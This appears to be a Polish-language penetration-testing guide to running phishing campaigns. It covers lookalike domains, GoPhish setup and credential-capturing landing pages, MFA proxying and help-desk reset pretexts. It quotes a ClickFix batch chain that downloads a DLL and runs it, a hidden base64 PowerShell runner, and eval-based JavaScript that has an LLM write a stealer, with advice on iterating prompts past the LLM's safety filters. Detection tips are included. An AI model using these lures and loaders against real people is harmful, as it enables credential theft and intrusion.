# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Recon ofiary  
1. Wybierz **victim domain**.  
2. Wykonaj podstawową enumerację webową, **szukając portali logowania** używanych przez ofiarę i **zdecyduj**, który z nich będziesz **podszywać się**.  
3. Użyj OSINT, aby **znaleźć adresy e-mail**.  
2. Przygotuj środowisko  
1. **Kup domenę**, której będziesz używać do oceny phishingowej  
2. **Skonfiguruj rekordy** związane z usługą e-mail (SPF, DMARC, DKIM, rDNS)  
3. Skonfiguruj VPS z **gophish**  
3. Przygotuj kampanię  
1. Przygotuj **szablon e-mail**  
2. Przygotuj **stronę web** do wykradania poświadczeń  
4. Uruchom kampanię!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Nazwa domeny **zawiera** istotne **słowo kluczowe** oryginalnej domeny (np. zelster.com-management.com).  
- **hypened subdomain**: Zmień **kropkę na myślnik** w subdomenie (np. www-zelster.com).  
- **New TLD**: Ta sama domena używając **nowego TLD** (np. zelster.org)  
- **Homoglyph**: **Zastępuje** literę w nazwie domeny literami, które **wyglądają podobnie** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).  
- **Singularization/Pluralization**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).  
- **Omission**: **Usuwa jedną** z liter w nazwie domeny (np. zelser.com).  
- **Repetition:** **Powtarza jedną** z liter w nazwie domeny (np. zeltsser.com).  
- **Replacement**: Podobne do homoglyph, ale mniej ukryte. Zastępuje jedną z liter w nazwie domeny, być może literą w pobliżu oryginalnej litery na klawiaturze (np. zektser.com).  
- **Subdomained**: Wprowadza **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).  
- **Insertion**: **Wstawia literę** do nazwy domeny (np. zerltser.com).  
- **Missing dot**: Dopisuje TLD do nazwy domeny. (np. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)  
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)  
- [https://dnstwister.report/](https://dnstwister.report)  
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre bity przechowywane lub przesyłane zostaną automatycznie odwrócone** z powodu różnych czynników jak rozbłyski słoneczne, promieniowanie kosmiczne czy błędy sprzętowe.

Gdy ta koncepcja jest **zastosowana do zapytań DNS**, możliwe jest, że **domena otrzymana przez serwer DNS** nie jest taka sama jak domena początkowo zażądana.

Na przykład, pojedyncza modyfikacja bitu w domenie "windows.com" może zmienić ją na "windnws.com."

Atakujący mogą **wykorzystać to, rejestrując wiele domen podatnych na bit-flipping**, podobnych do domeny ofiary. Ich zamiarem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Po więcej informacji przeczytaj [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Możesz wyszukać na [https://www.expireddomains.net/](https://www.expireddomains.net) wygasłą domenę, której mógłbyś użyć.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobrą SEO**, możesz sprawdzić jak jest kategoryzowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)  
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% darmowe)  
- [https://phonebook.cz/](https://phonebook.cz) (100% darmowe)  
- [https://maildb.io/](https://maildb.io)  
- [https://hunter.io/](https://hunter.io)  
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **odkryć więcej** prawidłowych adresów e-mail lub **zweryfikować te**, które już odkryłeś, możesz sprawdzić, czy możesz brute-force’ować serwery SMTP ofiary. [Dowiedz się, jak weryfikować/odkrywać adresy e-mail tutaj](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto, nie zapomnij, że jeśli użytkownicy używają **jakiegokolwiek portalu webowego do dostępu do swojej poczty**, możesz sprawdzić, czy jest on podatny na **brute force nazw użytkowników** i wykorzystać tę podatność, jeśli to możliwe.

## Configuring GoPhish

### Installation

Możesz pobrać go z [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz i rozpakuj wewnątrz `/opt/gophish` i uruchom `/opt/gophish/gophish`\
W wyjściu zostanie podane hasło dla użytkownika admin na porcie 3333. Zatem uzyskaj dostęp do tego portu i użyj tych poświadczeń, aby zmienić hasło administratora. Może być konieczne tunelowanie tego portu lokalnie:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed tym krokiem powinieneś mieć **już zakupioną domenę**, której zamierzasz użyć i musi ona **wskazywać** na **adres IP VPS**, na którym konfigurujesz **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień także wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmodyfikuj pliki **`/etc/hostname`** i **`/etc/mailname`** ustawiając nazwę domeny i **uruchom ponownie VPS.**

Teraz utwórz **DNS A record** dla `mail.<domain>` wskazujący na **adres IP** VPS i rekord **DNS MX** wskazujący na `mail.<domain>`

Teraz przetestujmy wysyłanie e-maila:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Konfiguracja Gophish**

Zatrzymaj działanie gophish i skonfigurujmy go.\
Zmodyfikuj `/opt/gophish/config.json` tak, aby wyglądał następująco (zwróć uwagę na użycie https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Skonfiguruj usługę gophish**

Aby utworzyć usługę gophish tak, aby mogła być uruchamiana automatycznie i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` z następującą zawartością:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Dokończ konfigurację usługi i sprawdź ją, wykonując:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfiguracja serwera pocztowego i domeny

### Czekaj i bądź wiarygodny

Im starsza domena, tym mniejsze prawdopodobieństwo, że zostanie oznaczona jako spam. Powinieneś więc odczekać jak najdłużej (przynajmniej 1 tydzień) przed phishing assessment. Ponadto, jeśli umieścisz stronę dotyczącą sektora o dobrej reputacji, uzyskana reputacja będzie lepsza.

Zauważ, że nawet jeśli musisz poczekać tydzień, możesz już teraz dokończyć konfigurację wszystkiego.

### Skonfiguruj Reverse DNS (rDNS) rekord

Ustaw rekord rDNS (PTR), który mapuje adres IP maszyny VPS na nazwę domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz użyć [https://www.spfwizard.net/](https://www.spfwizard.net) do wygenerowania swojej polityki SPF (użyj IP maszyny VPS)

![](<../../images/image (1037).png>)

To jest zawartość, którą należy ustawić w rekordzie TXT w domenie:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Rekord DMARC (Domain-based Message Authentication, Reporting & Conformance)

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący nazwę hosta `_dmarc.<domain>` z następującą zawartością:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Musisz połączyć obie wartości B64, które generuje klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Przetestuj wynik konfiguracji poczty

Możesz to zrobić, używając [https://www.mail-tester.com/](https://www.mail-tester.com/)\  
Po prostu wejdź na stronę i wyślij e-mail na adres, który Ci podadzą:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Możesz też **sprawdzić konfigurację poczty** wysyłając e-mail na `check-auth@verifier.port25.com` i **przeczytać odpowiedź** (będziesz musiał **otworzyć** port **25** i sprawdzić odpowiedź w pliku _/var/mail/root_, jeśli wyślesz wiadomość jako root).\
Sprawdź, czy przechodzisz wszystkie testy:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Możesz także wysłać **wiadomość na konto Gmail, którym zarządzasz**, i sprawdzić **nagłówki emaila** w swojej skrzynce odbiorczej Gmail, `dkim=pass` powinno być obecne w polu nagłówka `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Usuwanie z czarnej listy Spamhouse

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez Spamhouse. Możesz poprosić o usunięcie domeny/IP na: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z czarnej listy Microsoft

​​Możesz poprosić o usunięcie domeny/IP na [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Ustaw jakąś **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta wyślesz phishingowe e-maile. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić puste pola nazwa użytkownika i hasło, ale upewnij się, że zaznaczono opcję Ignore Certificate Errors

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> It's recommended to use the "**Send Test Email**" functionality to test that everything is working.\
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

### Email Template

- Ustaw jakąś **nazwę identyfikującą** szablon
- Następnie wpisz **temat** (nic podejrzanego, coś, czego można oczekiwać w zwykłym e-mailu)
- Upewnij się, że zaznaczyłeś opcję "**Add Tracking Image**"
- Napisz **treść e-maila** (możesz użyć zmiennych jak w poniższym przykładzie):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Zauważ, że w celu zwiększenia wiarygodności e-maila, zaleca się użycie jakiegoś podpisu z e-maila od klienta. Sugestie:

- Wyślij e-mail na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera jakiś podpis.
- Wyszukaj **publiczne e-maile** jak info@ex.com lub press@ex.com lub public@ex.com i wyślij im e-mail, a następnie poczekaj na odpowiedź.
- Spróbuj skontaktować się z **jakimś odnalezionym prawidłowym** adresem e-mail i poczekaj na odpowiedź

![](<../../images/image (80).png>)

> [!TIP]
> Szablon e-mail (Email Template) pozwala także **dołączać pliki do wysłania**. Jeśli chcesz także ukraść NTLM challenges używając specjalnie spreparowanych plików/dokumentów [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Wpisz **nazwę**
- **Wpisz kod HTML** strony. Zwróć uwagę, że możesz **importować** strony internetowe.
- Zaznacz **Capture Submitted Data** i **Capture Passwords**
- Ustaw **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Zazwyczaj będziesz musiał modyfikować kod HTML strony i przeprowadzać testy lokalnie (może z użyciem serwera Apache), **aż osiągniesz zadowalający efekt.** Następnie wklej ten kod HTML w pole.\
> Zauważ, że jeśli potrzebujesz **użyć statycznych zasobów** dla HTML (np. jakiś CSS i JS) możesz zapisać je w _**/opt/gophish/static/endpoint**_ i potem odwoływać się do nich z _**/static/\<filename>**_

> [!TIP]
> W przypadku przekierowania możesz **przekierować użytkowników na legit główną stronę** ofiary, lub przekierować ich do _/static/migration.html_, np. pokazać **wirujące koło ładowania (**[**https://loading.io/**](https://loading.io)**) przez 5 sekund i potem wskazać, że proces się powiódł**.

### Users & Groups

- Ustaw nazwę
- **Importuj dane** (zwróć uwagę, że aby użyć szablonu jako przykład, potrzebujesz firstname, last name i adresu e-mail każdego użytkownika)

![](<../../images/image (163).png>)

### Campaign

Na koniec utwórz kampanię, wybierając nazwę, email template, landing page, URL, sending profile i group. Zauważ, że URL będzie linkiem wysyłanym do ofiar.

Zwróć uwagę, że **Sending Profile pozwala wysłać testowy e-mail, aby zobaczyć jak finalny phishing e-mail będzie wyglądał**:

![](<../../images/image (192).png>)

> [!TIP]
> Zalecam **wysyłać testowe e-maile na adresy 10min mails**, aby uniknąć zablokowania przy testach.

Gdy wszystko jest gotowe, po prostu uruchom kampanię!

## Website Cloning

Jeśli z jakiegoś powodu chcesz sklonować stronę internetową, sprawdź następującą stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

W niektórych ocenach phishingowych (głównie dla Red Teams) możesz chcieć także **wysyłać pliki zawierające jakiegoś rodzaju backdoor** (może C2 lub coś, co wywoła uwierzytelnienie).\
Zobacz następującą stronę z przykładami:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Poprzedni atak jest całkiem sprytny, ponieważ podszywasz się pod prawdziwą stronę i zbierasz informacje wpisane przez użytkownika. Niestety, jeśli użytkownik nie poda prawidłowego hasła lub jeśli aplikacja, którą sfałszowałeś, jest skonfigurowana z 2FA, **te informacje nie pozwolą ci na podszycie się pod oszukanego użytkownika**.

Tutaj przydatne są narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). Narzędzie to pozwoli wygenerować atak typu MitM. W praktyce atak działa w następujący sposób:

1. Podszywasz się pod formularz logowania prawdziwej strony.
2. Użytkownik **wysyła** swoje **credentials** do twojej fałszywej strony, a narzędzie przesyła je do prawdziwej strony, **sprawdzając, czy dane działają**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o niego i gdy **użytkownik go wprowadzi**, narzędzie przekaże go do prawdziwej strony.
4. Gdy użytkownik zostanie uwierzytelniony, będziesz miał przechwycone credentials, 2FA, cookie i wszelkie informacje o każdej interakcji, dopóki narzędzie wykonuje MitM.

### Via VNC

Co jeśli zamiast **wysyłać ofiarę na złośliwą stronę** o wyglądzie identycznym z oryginałem, wyślesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną**? Będziesz mógł obserwować, co robi, ukraść hasło, użyte MFA, cookies...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Oczywiście jednym z najlepszych sposobów, aby wiedzieć, czy zostałeś namierzony, jest **wyszukanie twojej domeny w czarnych listach**. Jeśli pojawia się na liście, w jakiś sposób twoja domena została wykryta jako podejrzana.\
Prostym sposobem, aby sprawdzić, czy twoja domena pojawia się w jakiejkolwiek czarnej liście, jest użycie [https://malwareworld.com/](https://malwareworld.com)

Jednak istnieją inne sposoby, aby dowiedzieć się, czy ofiara **aktywnie poszukuje podejrzanej aktywności phishingowej w sieci**, jak wyjaśniono w:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o bardzo podobnej nazwie** do domeny ofiary **i/lub wygenerować certyfikat** dla **subdomeny** domeny kontrolowanej przez ciebie **zawierającej** **keyword** domeny ofiary. Jeśli **ofiara** wykona jakąkolwiek interakcję DNS lub HTTP z nimi, dowiesz się, że **aktywnie szuka** podejrzanych domen i będziesz musiał być bardzo ukryty.

### Evaluate the phishing

Użyj [**Phishious** ](https://github.com/Rices/Phishious) aby ocenić, czy twój e-mail trafi do folderu spam, czy zostanie zablokowany lub będzie skuteczny.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Nowoczesne zespoły atakujące coraz częściej pomijają wysyłki e-mail i **bezpośrednio celują w service-desk / identity-recovery workflow**, aby obejść MFA. Atak jest w pełni "living-off-the-land": gdy operator zdobędzie prawidłowe credentials, przemieszcza się z użyciem wbudowanych narzędzi admina – nie jest wymagane żadne malware.

### Attack flow
1. Rozpoznanie ofiary
* Zbieraj dane osobowe i korporacyjne z LinkedIn, wycieków danych, publicznego GitHub itp.
* Identyfikuj wartościowe tożsamości (członkowie zarządu, IT, finanse) i wyenumeruj **dokładny proces help-desk** dla resetu hasła / MFA.
2. Socjotechnika w czasie rzeczywistym
* Telefon, Teams lub czat do help-desk udając cel (często z **spoofed caller-ID** lub **cloned voice**).
* Podaj wcześniej zebrane PII, aby przejść weryfikację opartą na wiedzy.
* Przekonaj agenta, aby **zresetował sekret MFA** lub wykonał **SIM-swap** na zarejestrowany numer mobilny.
3. Natychmiastowe działania po dostępie (≤60 min w rzeczywistych przypadkach)
* Ustanów punkt przyczepienia przez dowolne web SSO portal.
* Enumeruj AD / AzureAD przy użyciu wbudowanych narzędzi (bez upuszczania binarek):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ruch boczny z użyciem **WMI**, **PsExec**, lub legalnych agentów **RMM** już białej listy w środowisku.

### Detection & Mitigation
* Traktuj identity recovery w help-desk jako **operację uprzywilejowaną** – wymagaj step-up auth i zatwierdzenia przez menedżera.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które generują alerty przy:
* Zmiana metody MFA + uwierzytelnienie z nowego urządzenia / geolokalizacji.
* Natychmiastowe podniesienie uprawnień tej samej tożsamości (user → admin).
* Nagrywaj rozmowy help-desk i wymuszaj **call-back na wcześniej zarejestrowany numer** przed jakimkolwiek resetem.
* Wprowadź **Just-In-Time (JIT) / Privileged Access**, aby nowo zresetowane konta **nie** automatycznie odziedziczały tokeny o wysokich uprawnieniach.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Zespoły operujące na dużą skalę równoważą koszty operacji wysokiego dotyku masowymi atakami, które zamieniają **wyszukiwarki & sieci reklamowe w kanał dostawy**.

1. **SEO poisoning / malvertising** wypycha fałszywy wynik, taki jak `chromium-update[.]site`, na szczyt reklam w wyszukiwarce.
2. Ofiara pobiera mały **first-stage loader** (często JS/HTA/ISO). Przykłady zaobserwowane przez Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader wykrada ciasteczka przeglądarki + credential DBs, potem pobiera **silent loader**, który decyduje – *w czasie rzeczywistym* – czy wdrożyć:
* RAT (np. AsyncRAT, RustDesk)
* ransomware / wiper
* komponent trwałości (klucz Run w rejestrze + zaplanowane zadanie)

### Hardening tips
* Blokuj nowo zarejestrowane domeny i egzekwuj **Advanced DNS / URL Filtering** dla *search-ads* oraz e-maili.
* Ogranicz instalację oprogramowania do podpisanych pakietów MSI / Store, zabroń wykonania `HTA`, `ISO`, `VBS` przez politykę.
* Monitoruj uruchamianie instalatorów przez procesy potomne przeglądarek:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Łów LOLBins często nadużywane przez first-stage loadery (np. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: sklonowane krajowe ogłoszenie CERT z przyciskiem **Update**, które pokazuje krok po kroku instrukcję „fix”. Ofiary są proszone o uruchomienie batcha, który pobiera DLL i uruchamia ją przez `rundll32`.
* Typowy łańcuch batcha obserwowany:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` zapisuje payload do `%TEMP%`, krótki sleep ukrywa jitter sieciowy, potem `rundll32` wywołuje zaeksportowaną entrypoint (`notepad`).
* DLL beaconuje tożsamość hosta i odpytyje C2 co kilka minut. Zdalne taskowanie przychodzi jako **base64-encoded PowerShell** wykonywany ukrycie i z pominięciem polityk:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* To zachowuje elastyczność C2 (serwer może zmieniać zadania bez aktualizacji DLL) i ukrywa okna konsoli. Szukaj PowerShell potomnych `rundll32.exe` używających `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` razem.
* Obrońcy mogą szukać callbacków HTTP(S) w formie `...page.php?tynor=<COMPUTER>sss<USER>` i 5-minutowych interwałów odpytywania po załadowaniu DLL.

---

## AI-Enhanced Phishing Operations
Atakujący teraz łączą **LLM & voice-clone APIs** dla w pełni spersonalizowanych przynęt i interakcji w czasie rzeczywistym.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generować i wysyłać >100k e-maili / SMS z zróżnicowanym brzmieniem i linkami śledzącymi.|
|Generative AI|Tworzyć *jednorazowe* e-maile odwołujące się do publicznych M&A, wewnętrznych żartów z social media; deep-fake głosu CEO w ataku telefonicznym.|
|Agentic AI|Autonomicznie rejestrować domeny, skrobać open-source intel, tworzyć kolejne wiadomości, gdy ofiara kliknie, ale nie poda credentials.|

**Obrona:**
• Dodaj **dynamiczne banery** podkreślające wiadomości wysłane z nieufnej automatyzacji (na podstawie anomalii ARC/DKIM).  
• Wdróż **voice-biometric challenge phrases** dla ryzykownych żądań telefonicznych.  
• Ciągle symuluj przynęty generowane przez AI w programach podnoszenia świadomości – statyczne szablony są przestarzałe.

Zobacz także – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Zobacz także – AI agent abuse of local CLI tools and MCP (dla inwentaryzacji sekretów i detekcji):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Atakujący mogą wysyłać wyglądający nieszkodliwie HTML i **generować stealer w czasie wykonywania** prosząc **zaufane LLM API** o JavaScript, a następnie wykonując go w przeglądarce (np. `eval` lub dynamiczny `<script>`).

1. **Prompt-as-obfuscation:** zakoduj exfil URLs/Base64 strings w prompcie; iteruj treść, aby ominąć filtry bezpieczeństwa i ograniczyć halucynacje.
2. **Client-side API call:** przy ładowaniu, JS wywołuje publiczne LLM (Gemini/DeepSeek/etc.) lub CDN proxy; w statycznym HTML znajduje się tylko prompt/API call.
3. **Assemble & exec:** połącz odpowiedź i wykonaj ją (polimorficznie dla każdej wizyty):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** wygenerowany kod personalizuje przynętę (np. LogoKit token parsing) i wysyła creds do prompt-hidden endpoint.

**Cechy unikania wykrycia**
- Ruch trafia do znanych domen LLM lub renomowanych proxy CDN; czasami przez WebSockets do backendu.
- Brak statycznego payloadu; złośliwy JS istnieje tylko po renderze.
- Niedeterministyczne generacje tworzą **unikalne** stealers dla każdej sesji.

**Pomysły na wykrywanie**
- Uruchamiaj sandboksy z włączonym JS; oznacz **runtime `eval`/dynamic script creation pochodzące z odpowiedzi LLM**.
- Szukaj front-endowych POSTs do LLM APIs, po których natychmiast następuje `eval`/`Function` na zwróconym tekście.
- Generuj alerty dla niesankcjonowanych domen LLM w ruchu klienta oraz późniejszych credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Poza klasycznym push-bombingiem, operatorzy po prostu **force a new MFA registration** podczas rozmowy z help-deskiem, unieważniając istniejący token użytkownika. Każdy kolejny login prompt wydaje się ofierze wiarygodny.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitoruj zdarzenia AzureAD/AWS/Okta, w których **`deleteMFA` + `addMFA`** występują **w ciągu kilku minut z tego samego IP**.



## Clipboard Hijacking / Pastejacking

Atakujący mogą cicho skopiować złośliwe polecenia do schowka ofiary ze skompromitowanej lub typosquatted strony i następnie nakłonić użytkownika do wklejenia ich w **Win + R**, **Win + X** lub oknie terminala, wykonując dowolny kod bez pobierania czy załącznika.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* The APK embeds static credentials and per-profile “unlock codes” (no server auth). Victims follow a fake exclusivity flow (login → locked profiles → unlock) and, on correct codes, are redirected into WhatsApp chats with attacker-controlled `+92` numbers while spyware runs silently.
* Collection starts even before login: immediate exfil of **device ID**, contacts (as `.txt` from cache), and documents (images/PDF/Office/OpenXML). A content observer auto-uploads new photos; a scheduled job re-scans for new documents every **5 minutes**.
* Persistence: registers for `BOOT_COMPLETED` and keeps a **foreground service** alive to survive reboots and background evictions.

### WhatsApp device-linking hijack via QR social engineering
* A lure page (e.g., fake ministry/CERT “channel”) displays a WhatsApp Web/Desktop QR and instructs the victim to scan it, silently adding the attacker as a **linked device**.
* Attacker immediately gains chat/contact visibility until the session is removed. Victims may later see a “new device linked” notification; defenders can hunt for unexpected device-link events shortly after visits to untrusted QR pages.

### Mobile‑gated phishing to evade crawlers/sandboxes
